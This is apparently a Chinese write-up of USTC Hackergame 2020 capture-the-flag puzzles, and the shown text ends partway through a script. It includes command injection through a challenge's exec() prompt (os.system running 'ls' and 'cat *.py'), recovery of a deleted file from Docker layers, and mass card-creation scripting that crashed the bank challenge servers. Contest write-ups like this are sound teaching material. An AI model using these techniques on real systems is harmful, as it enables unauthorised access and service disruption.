Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 <code>flag.txt</code>。</p>\n<p>由于 Docker Image 在构建时每一个 RUN 都会新建一个 Layer，因此即使 233 同学通过 RUN 删掉了 <code>flag.txt</code>，flag 肯定还存在于某个地方，而且「某个地方」就包括本机的 <code>/var/lib/docker/overlay2</code> ：</p>\n<pre><code class=\"hljs bash\">$ docker run 8b8d3c8324c7/stringtool <span class=\"hljs-comment\"># 下载执行 8b8d3c8324c7/stringtool</span>[Redacted]Nothing here... <span class=\"hljs-comment\"># Docker Image 执行的输出</span>$ <span class=\"hljs-built_in\">cd</span> /var/lib/docker/overlay2$ find -name flag.txt./befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/flag.txt./8c07cc3c01c52b8cf0684518e68a31bfb1f843392f973fef9add587d554c6fab/diff/code/flag.txt<span class=\"hljs-comment\"># Duang，flag.txt 它出现了</span>$ <span class=\"hljs-built_in\">cd</span> befaa134f7d0cc9e964e7790b7c11dde6d0df3104cd88667f7676e46f409705f/diff/code/$ cat flag.txt<span class=\"hljs-comment\"># flag 到手，嘿嘿</span></code></pre>\n<h2>从零开始的 HTTP 链接</h2>\n<blockquote>\n<p>众所周知，数组下标应当从 0 开始。</p>\n<p>同样的，TCP 端口也应当从 0 开始。为了实践这一点，我们把一个网站架设在服务器的 0 号端口上。</p>\n<p>你能成功连接到 0 号端口并拿到 flag 吗？</p>\n<p><strong>点击下面的打开题目按钮是无法打开网页的，因为普通的浏览器会认为这是无效地址。</strong></p>\n</blockquote>\n<p>TCP/IP 中「端口」这个概念，甚至早于互联网的发明：早在 ARPANET 网中的供电协议中就有 8 个比特用于决定应该由计算机上的哪个程序接收该信息（当时这 8 个比特被称为 AEN、Another Eight Numbers），可以参考我之前翻译的一篇文章「<a href=\"https://blog.skk.moe/post/history-of-url/\">URL 的历史</a>」。现在 TCP 的端口共有 16 个比特（最大支持到 65535）。其中，端口 0 作为保留端口，所以依然是可用的。虽然部分浏览器无法访问，这并不意味着 netcat 不能访问，对吧！</p>\n<p>当然这道题有几个坑点：</p>\n<ol>\n<li>现有发行版中分发的 <code>netcat</code> 都不是「原版」的，试图连接 Port 0 会报「Invalid Port」。因此可以选择直接手撸 Socket、或者更换另一个版本的 <code>netcat</code>。</li>\n<li>就算使用了合适的工具，由于 Darwin 的 XNU Kernel 非常鸡贼地阻止使用端口 0，所以在 macOS 上也依然没法做这道题。我不得不在 codeanywhere 上开了一个 Linux Container 跑这道题。</li>\n</ol>\n<p>和 HTTP/2 基于二进制帧不同，HTTP/0.9、HTTP/1.0、HTTP/1.1 协议都是基于明文的，因此可以手敲 Header：</p>\n<pre><code class=\"hljs bash\">nc 202.38.93.111 0GET / HTTP/1.1Host: 202.38.93.111Connection: close</code></pre>\n<p>接着终端里会打印出来一串 HTML、隐约还可以看见 <code>xterm.js</code>，这不就是 Hackergame 的 Web 端做题界面嘛！由于去年在参与 USTC Hackergame 时就研究过这个界面、已经知道交互是通过 <code>/shell</code> 路径下的 WebSocket 连接实现的。因此直接使用 <a href=\"https://github.com/vi/websocat\">websocat</a> 完成 WebSocket 交互，就和 netcat 一样：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-comment\"># 如果没有 websocat 的话</span>$ wget https://github.com/vi/websocat/releases/download/v1.6.0/websocat_nossl_amd64-linux$ chmod +x websocat_nossl_amd64-linux<span class=\"hljs-comment\"># 开始获取 Flag</span>$ ./websocat_nossl_amd64-linux ws://202.38.93.111:0/shellPlease input your token: [Redacted]<span class=\"hljs-comment\"># Flag 到手！</span></code></pre>\n<h2>超简陋的 OpenGL 小程序</h2>\n<blockquote>\n<p>年轻人的第一个 OpenGL 小程序。</p>\n<p>（嗯，有什么被挡住了？）</p>\n</blockquote>\n<p><a href=\"https://archive.org/details/glhackergame_2020\">下载地址</a> （Hosted at Internet Archive）</p>\n<p>由于苏卡卡是参赛的两千多名选手中最菜的那一个、完全不懂 OpenGL、完全不懂图形学，为了做这道题不得不去翻了一下「Learn OpenGL CN」，知道了 VS（Vertex Shader）是顶点着色器、可以处理顶点属性确定形状，和 FS（Fragment Shader）是片段着色器、可以算颜色，然后就开始硬上了。在花了半个小时盲目乱改 VS 的参数后，成功让「犹抱琵琶半遮面」的 flag 露出了右上角：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/16.jpg\" width=\"1280\" height=\"571\" class=\"lazy post-img\"></p>\n<p>凭借着漏出来的部分，我成功认出了 <code>l</code>、<code>Graphic</code>、<code>Happy</code>、<code>(233);</code>。剩下的就要靠猜了，我猜过的 flag 有：</p>\n<ul>\n<li>\n<code>flag{GraphicHappy(223);}</code> （整体长度都不对）</li>\n<li>\n<code>flag{GraphicsHappy(223);}</code> （ <code>c</code> 和 <code>H</code> 之间还有个类似 <code>c</code> 的字母、那就是 <code>s</code> 了，不过还是不够长）</li>\n<li>\n<code>flag{gl_GraphicsHappy(223);}</code> （OpenGL 里不少 <code>gl_</code> 前缀，加上认出来一个 <code>l</code>，试试看）</li>\n<li>\n<code>flag{glGraphicsHappy(223);}</code> （<code>l</code> 和 <code>G</code> 之间的距离没那么长，终于猜对了）</li>\n</ul>\n<blockquote><p>这道题的正确解法是利用未被使用的向量 <code>Normal</code>。苏卡卡虽然有注意到 Normal 未被使用过，但是由于完全不会 OpenGL、并不知道怎么添加向量。</p></blockquote>\n<p>这种解法没什么好自豪的，你看这只大尾巴狐狸就是逊啦。</p>\n<h2>来自未来的信笺</h2>\n<blockquote>\n<p>你收到了一封邮件。没有标题，奇奇怪怪的发件人，和一份奇怪的附件。日期显示的是 3020 年 10 月 31 日。</p>\n<p>“Send from Arctic.” 正文就只有这一句话。</p>\n<p>「谁搞的恶作剧啊……话说这竟然没有被垃圾邮件过滤器过滤掉？」你一边嘟囔着一边解压了附件——只看到一堆二维码图片。</p>\n<p>看起来有点意思。你不禁想试试，能否从其中得到什么有意义的东西。</p>\n</blockquote>\n<p>谁会在 1000 年以后从北极给你发一封电子邮件？那当然是 <a href=\"https://archiveprogram.github.com/\">GitHub Archive Program</a> 啦 —— 今年年初，GitHub 将现存的活跃开源项目全部以二维码的形式刻录在胶片上、埋进了北极世界档案馆（AWA，位于斯瓦尔巴群岛一个位于北极冻土之下的废弃煤矿中，和 Global Seed Vault 仅一英里之遥）中。为了做这道题，让我们读一读 GitHub Archive Program 为「后人」提供的指南：</p>\n<ul>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE.md\">A Guide To the GitHub Code Vault</a>」</p></li>\n<li><p>「<a href=\"https://github.com/github/archive-program/blob/master/GUIDE_zh.md\">GitHub Code Vault 指南（简体中文）</a>」</p></li>\n</ul>\n<p>这里摘抄简体中文版指南的一部分内容：</p>\n<blockquote>\n<p>每个二维码由一个个白色或黑色小方块组成，该等小方块几乎占据胶片的整个帧。 使用二维码的原因在于，其比人类可读的文本更紧凑而可靠。 二维码可解码为二进制数据，即一系列 1 和 0。</p>\n<p>……</p>\n<p>我们可将 TAR 文件嵌套进 TAR 文件，就像在容器中装入另一容器，而这正是大部分存档数据的存储方式。 无论哪个仓库，其外层 TAR 文件都将至少包含如下内容：</p>\n<ul>\n<li>一个名为 META 的未压缩元数据文件，其包含仓库名称、帐户名、说明、语言、星数、复刻数</li>\n<li>一个名为 COMMITS 的压缩文件（如下所述），包含该仓库有史以来的更改记录</li>\n<li>一个名为 repo.tar.xz 的文件，是包含实际仓库内容的压缩 TAR 文件</li>\n</ul>\n<p>其它诸如 wiki、gh-page、issue 和 pull request 等元数据也可能包含在不同压缩文件中。</p>\n</blockquote>\n<p>现在我们知道了这些二维码是什么、二维码们中存储了什么数据、数据的格式，接下来就该写一个脚本把所有二维码全部解析出来了：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-keyword\">import</span> zxing<span class=\"hljs-keyword\">import</span> osreader = zxing.BarCodeReader()<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">parseQRCode</span>(<span class=\"hljs-params\">img_path</span>):</span>    barcode = reader.decode(img_path).encode().decode(<span class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    